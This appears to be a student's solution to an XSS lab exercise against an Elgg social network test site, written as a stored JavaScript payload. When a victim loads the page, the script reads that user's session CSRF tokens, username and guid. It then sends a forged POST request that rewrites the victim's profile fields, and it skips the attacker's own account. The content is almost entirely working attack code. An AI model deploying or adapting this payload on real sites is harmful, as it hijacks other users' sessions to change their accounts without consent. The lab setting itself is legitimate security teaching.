//task2

<script type="text/javascript">
	window.onload = function(){
	//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
	//and Security Token __elgg_token
	var ts="__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	var username=elgg.session.user.username
	var userguid=elgg.session.user.guid
	//Construct the content of your url.
        var sendurl="http://www.xsslabelgg.com/action/profile/edit"
	 //FILL IN
    // I sent an edit request from samy after filling all the field.Then from network portion I click on editand resend. There I     	observed the request body.
	var content=ts+token+"&name="+username+"&description="+"I am a student"+"&accesslevel%5Bdescription%5D=1& briefdescription=1605026&accesslevel%5Bbriefdescription%5D=1&location=malghar&accesslevel%5Blocation%5D=1& interests=Fighting&accesslevel%5Binterests%5D=1&skills=Sleeping&accesslevel%5Bskills%5D=1&contactemail=example@gmail.com& accesslevel%5Bcontactemail%5D=1&phone=33224&accesslevel%5Bphone%5D=1&mobile=018123456789&accesslevel%5Bmobile%5D=1&website=https://www.prothomalo.com&accesslevel%5Bwebsite%5D=1&twitter=wow&accesslevel%5Btwitter%5D=1&guid="+userguid;

	if(elgg.session.user.guid!=47)
	{
		//Create and send Ajax request to modify profile
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(content);
	}
	}
</script>
